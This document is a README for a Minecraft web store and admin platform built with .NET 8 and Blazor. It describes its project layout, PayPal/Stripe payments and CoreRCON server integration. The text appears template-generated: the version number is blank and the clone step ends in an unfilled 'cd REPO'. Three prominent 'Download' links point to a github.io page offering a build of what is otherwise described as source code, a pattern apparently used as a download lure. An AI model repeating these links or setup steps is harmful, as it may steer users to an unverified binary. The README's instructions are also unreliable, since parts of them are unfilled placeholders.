# SentrySMP - Minecraft Website 2026

> A browser-based Minecraft shop and administration platform for SentrySMP, implemented with .NET and Blazor to tie together the storefront, backend services, and server-side operations for version 2026.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/wardzack91/sentrysmp-web-store-blazor?style=flat-square)](https://github.com/wardzack91/sentrysmp-web-store-blazor)

---

<p align="center">
  <a href="https://wardzack91.github.io/sentrysmp-web-store-blazor/">
    <img src="https://img.shields.io/badge/Download-SentrySMP%20Latest-brightgreen?style=for-the-badge" alt="Download SentrySMP">
  </a>
</p>

> **[Direct Download - SentrySMP v](https://wardzack91.github.io/sentrysmp-web-store-blazor/)**

---

[Download Latest Build](https://wardzack91.github.io/sentrysmp-web-store-blazor/)

---

## Overview

SentrySMP is a web application built around a Minecraft shop workflow, bringing storefront functionality, backend services, and admin tools into a single solution. Its .NET multi-project setup keeps the app, API, admin area, shared components, and domain logic separated for cleaner maintenance and easier navigation.

It is aimed at teams that want a website connected to a Minecraft server and its economy or item shop systems. With payment provider support and server communication in place, administrators can handle products, orders, and Minecraft-related integrations from one central place.

---

## What It Includes

- Connected web frontend and backend application
- Minecraft shop website for selling in-game items or related offers
- Admin panel for managing content and site operations
- Multi-project layout: App, Api, Admin, Shared, and Domain
- Payment integration support for PayPal and Stripe
- Minecraft server connectivity through CoreRCON
- .NET 8 and Blazor-based architecture
- Entity Framework Core and Refit in the application stack

---

## Getting Started

To work with the project, clone the repository and open it in a .NET 8-capable development environment:

```bash
git clone https://github.com/wardzack91/sentrysmp-web-store-blazor.git
cd REPO
```

After that, restore the dependencies and run the project that fits your current task, whether that is the web app, API, or admin project.

---

## Working With the Platform

What you run will depend on the part of the system you are focusing on:

- Launch the web app to provide the storefront experience
- Start the API for backend communication and application data
- Use the admin panel to manage shop content and operational settings
- Connect the Minecraft server layer through CoreRCON where needed
- Configure payment providers before enabling purchase flows

For local development, start the project that matches the job you are doing, then wire up the other services needed for the shop flow.

---

## Configuration

Project settings are usually managed through application configuration files and environment-specific values. The main items to review are:

- payment provider credentials for PayPal and Stripe
- database connection details for Entity Framework Core
- server connection settings for CoreRCON
- API endpoints used by frontend and admin projects

A simple example structure may look like this:

```json
{
  "ConnectionStrings": {
    "DefaultConnection": ""
  },
  "Payments": {
    "PayPal": {},
    "Stripe": {}
  },
  "Minecraft": {
    "CoreRCON": {}
  }
}
```

---

## Requirements

- Web hosting environment for the site
- .NET 8 runtime or SDK for development and deployment
- Compatible database for Entity Framework Core
- Access to Minecraft server connection details for CoreRCON integration
- Valid PayPal and Stripe configuration if payments are enabled

---

## Common Questions

### How do I get updates?
Pull the newest changes from the repository and redeploy the web projects you use in your environment.

### Where are site settings managed?
Operational settings are typically handled through the admin panel and application configuration.

### Can I connect this to a Minecraft server?
Yes, the project includes Minecraft server integration support through CoreRCON.

### What should I check if payments are not working?
Review your PayPal and Stripe configuration, environment values, and any backend logs related to checkout flows.

### Is there a single entry point?
The repository is organized into multiple projects, so the exact startup target depends on whether you are running the app, API, or admin area.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
